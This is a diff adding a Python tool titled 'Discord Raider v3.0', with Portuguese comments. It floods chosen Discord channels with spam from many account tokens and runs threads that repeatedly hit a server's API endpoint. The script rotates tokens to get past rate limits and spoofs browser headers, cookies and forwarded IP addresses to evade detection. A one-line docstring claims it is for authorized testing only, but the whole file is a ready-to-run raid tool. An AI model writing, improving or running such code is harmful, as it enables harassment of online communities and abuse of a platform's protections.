@@ -1,0 +1,300 @@
+#!/usr/bin/env python3
+"""
+DISCORD RAIDER v3.0
+Uso exclusivo para teste de servidores próprios ou autorizados.
+"""
+
+import requests
+import threading
+import time
+import random
+import string
+import json
+import os
+import sys
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from colorama import Fore, init
+
+init(autoreset=True)
+
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.146 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
+]
+
+REFERRERS = [
+    "https://discord.com/channels/@me",
+    "https://discord.com/",
+    "https://www.google.com/",
+    "https://www.bing.com/",
+    "https://duckduckgo.com/",
+]
+
+def gerar_ip_falso():
+    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+
+def gerar_sessao():
+    sid = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
+    cookies = [
+        f"__dcfduid={random.randint(100000,999999)}",
+        f"__sdcfduid={random.randint(100000,999999)}",
+        f"locale=pt-BR",
+        f"_ga=GA1.1.{random.randint(100000,999999)}.{int(time.time())}",
+    ]
+    return "; ".join(cookies)
+
+class TokenManager:
+    def __init__(self, tokens):
+        self.tokens = tokens
+        self.lock = threading.Lock()
+        self.token_rate_limits = {t: {"last_used": 0, "count": 0} for t in tokens}
+
+    def get_token(self):
+        with self.lock:
+            now = time.time()
+            best_token = None
+            best_wait = 0
+            for token, info in self.token_rate_limits.items():
+                elapsed = now - info["last_used"]
+                if elapsed >= 1.0:
+                    info["last_used"] = now
+                    info["count"] = 0
+                    return token
+                else:
+                    wait = 1.0 - elapsed
+                    if best_token is None or wait < best_wait:
+                        best_token = token
+                        best_wait = wait
+            if best_token:
+                time.sleep(best_wait)
+                self.token_rate_limits[best_token]["last_used"] = time.time()
+                self.token_rate_limits[best_token]["count"] = 0
+                return best_token
+            return random.choice(self.tokens)
+
+    def mark_rate_limited(self, token, retry_after=2):
+        with self.lock:
+            self.token_rate_limits[token]["last_used"] = time.time() + retry_after
+
+class DiscordHTTPClient:
+    def __init__(self, proxy=None):
+        self.session = requests.Session()
+        self.proxy = {"http": proxy, "https": proxy} if proxy else None
+
+    def build_headers(self, token, extra=None):
+        ua = random.choice(USER_AGENTS)
+        ip = gerar_ip_falso()
+        headers = {
+            "User-Agent": ua,
+            "Accept": "*/*",
+            "Accept-Language": "pt-BR,pt;q=0.9",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Authorization": token,
+            "Content-Type": "application/json",
+            "Origin": "https://discord.com",
+            "Referer": random.choice(REFERRERS),
+            "X-Forwarded-For": ip,
+            "X-Real-IP": ip,
+            "X-Discord-Timezone": "America/Sao_Paulo",
+            "sec-ch-ua": '"Chromium";v="125", "Google Chrome";v="125", "Not?A_Brand";v="99"',
+            "sec-ch-ua-mobile": "?0",
+            "sec-ch-ua-platform": '"Windows"',
+            "Cookie": gerar_sessao(),
+        }
+        if extra:
+            headers.update(extra)
+        return headers
+
+    def post_message(self, channel_id, token, content):
+        headers = self.build_headers(token, {
+            "Referer": f"https://discord.com/channels/@me/{channel_id}"
+        })
+        payload = {
+            "content": content,
+            "nonce": str(random.randint(1000000000000000000, 9999999999999999999)),
+            "tts": False,
+        }
+        try:
+            resp = self.session.post(
+                f"https://discord.com/api/v9/channels/{channel_id}/messages",
+                headers=headers,
+                json=payload,
+                timeout=8,
+                proxies=self.proxy,
+            )
+            return resp.status_code, resp.json() if resp.text else {}
+        except Exception as e:
+            return 0, {"error": str(e)}
+
+    def get_guild(self, server_id, token):
+        headers = self.build_headers(token)
+        try:
+            resp = self.session.get(
+                f"https://discord.com/api/v9/guilds/{server_id}",
+                headers=headers,
+                timeout=8,
+                proxies=self.proxy,
+            )
+            return resp.status_code
+        except:
+            return 0
+
+class DiscordRaider:
+    def __init__(self, server_id, channel_ids, tokens, thread_count=20,
+                 duration=120, message_spam=True, messages_list=None,
+                 single_message=None, proxy=None):
+        self.server_id = server_id
+        self.channel_ids = channel_ids
+        self.token_manager = TokenManager(tokens)
+        self.thread_count = thread_count
+        self.duration = duration
+        self.message_spam = message_spam
+        self.messages_list = messages_list or []
+        self.single_message = single_message
+        self.client = DiscordHTTPClient(proxy=proxy)
+
+        self.messages_sent = 0
+        self.errors = 0
+        self.rate_limits = 0
+        self.lock = threading.Lock()
+        self.stop_flag = threading.Event()
+
+    def _get_message(self):
+        if self.single_message:
+            return self.single_message
+        if self.messages_list:
+            return random.choice(self.messages_list)
+        return random.choice([
+            "Hello!",
+            "Test message",
+            "Just passing by...",
+            "Raid test - authorized",
+            "Lorem ipsum dolor sit amet",
+        ])
+
+    def _worker_spam(self):
+        while not self.stop_flag.is_set():
+            token = self.token_manager.get_token()
+            channel = random.choice(self.channel_ids)
+            content = self._get_message()
+
+            status, resp = self.client.post_message(channel, token, content)
+
+            with self.lock:
+                if status == 200:
+                    self.messages_sent += 1
+                elif status == 429:
+                    self.rate_limits += 1
+                    retry = resp.get("retry_after", 2)
+                    self.token_manager.mark_rate_limited(token, retry)
+                    time.sleep(retry)
+                else:
+                    self.errors += 1
+                    if status in (401, 403):
+                        time.sleep(5)
+            time.sleep(random.uniform(0.1, 0.3))
+
+    def _worker_ping(self):
+        while not self.stop_flag.is_set():
+            token = self.token_manager.get_token()
+            self.client.get_guild(self.server_id, token)
+            time.sleep(0.2)
+
+    def start(self):
+        print(f"\n{Fore.CYAN}{'='*60}")
+        print(f"{Fore.CYAN}  DISCORD RAIDER v3.0")
+        print(f"{Fore.CYAN}  Servidor: {self.server_id}")
+        print(f"{Fore.CYAN}  Canais: {len(self.channel_ids)}")
+        print(f"{Fore.CYAN}  Tokens: {len(self.token_manager.tokens)}")
+        print(f"{Fore.CYAN}  Threads: {self.thread_count}")
+        print(f"{Fore.CYAN}  Duração: {self.duration}s")
+        print(f"{Fore.CYAN}  Spam: {'SIM' if self.message_spam else 'NÃO'}")
+        print(f"{Fore.CYAN}{'='*60}\n")
+
+        threads = []
+
+        if self.message_spam:
+            spam_threads = int(self.thread_count * 0.7)
+            for _ in range(spam_threads):
+                t = threading.Thread(target=self._worker_spam, daemon=True)
+                t.start()
+                threads.append(t)
+
+        ping_threads = self.thread_count - len(threads)
+        for _ in range(ping_threads):
+            t = threading.Thread(target=self._worker_ping, daemon=True)
+            t.start()
+            threads.append(t)
+
+        print(f"{Fore.GREEN}[+] {len(threads)} threads iniciadas\n")
+
+        start = time.time()
+        try:
+            while time.time() - start < self.duration:
+                remaining = int(self.duration - (time.time() - start))
+                with self.lock:
+                    print(f"\r{Fore.CYAN}[*] Enviadas: {self.messages_sent} | "
+                          f"Rate Limits: {self.rate_limits} | Erros: {self.errors} | "
+                          f"Restante: {remaining}s   ", end="")
+                time.sleep(1)
+        except KeyboardInterrupt:
+            print(f"\n{Fore.YELLOW}[!] Interrompido")
+        finally:
+            self.stop_flag.set()
+
+        for t in threads:
+            t.join(timeout=3)
+
+        print(f"\n\n{Fore.GREEN}{'='*60}")
+        print(f"{Fore.GREEN}  RAID FINALIZADO")
+        print(f"{Fore.GREEN}  Mensagens enviadas: {self.messages_sent}")
+        print(f"{Fore.GREEN}  Rate limits: {self.rate_limits}")
+        print(f"{Fore.GREEN}  Erros: {self.errors}")
+        print(f"{Fore.GREEN}{'='*60}\n")
+
+if __name__ == "__main__":
+    import argparse
+    parser = argparse.ArgumentParser(description="Discord Raider v3.0")
+    parser.add_argument("--server-id", required=True, help="ID do servidor")
+    parser.add_argument("--channels", required=True, help="IDs dos canais separados por vírgula")
+    parser.add_argument("--tokens-file", default="tokens.txt", help="Arquivo com tokens (um por linha)")
+    parser.add_argument("--threads", type=int, default=20, help="Número de threads")
+    parser.add_argument("--duration", type=int, default=120, help="Duração em segundos")
+    parser.add_argument("--spam", action="store_true", help="Ativar spam de mensagens")
+    parser.add_argument("--messages-file", help="Arquivo com mensagens (uma por linha)")
+    parser.add_argument("--message", help="Mensagem única para spam")
+    parser.add_argument("--proxy", help="Proxy HTTP (ex: http://127.0.0.1:8080)")
+    args = parser.parse_args()
+
+    tokens = []
+    if os.path.exists(args.tokens_file):
+        with open(args.tokens_file) as f:
+            tokens = [line.strip() for line in f if line.strip() and len(line.strip()) > 50]
+    if not tokens:
+        print(f"{Fore.RED}[-] Nenhum token válido encontrado em {args.tokens_file}")
+        sys.exit(1)
+    print(f"{Fore.GREEN}[+] {len(tokens)} tokens carregados")
+
+    messages = []
+    if args.messages_file and os.path.exists(args.messages_file):
+        with open(args.messages_file, encoding="utf-8") as f:
+            messages = [line.strip() for line in f if line.strip()]
+
+    channel_ids = [c.strip() for c in args.channels.split(",") if c.strip()]
+
+    raider = DiscordRaider(
+        server_id=args.server_id,
+        channel_ids=channel_ids,
+        tokens=tokens,
+        thread_count=args.threads,
+        duration=args.duration,
+        message_spam=args.spam,
+        messages_list=messages,
+        single_message=args.message,
+        proxy=args.proxy,
+    )
+    raider.start()
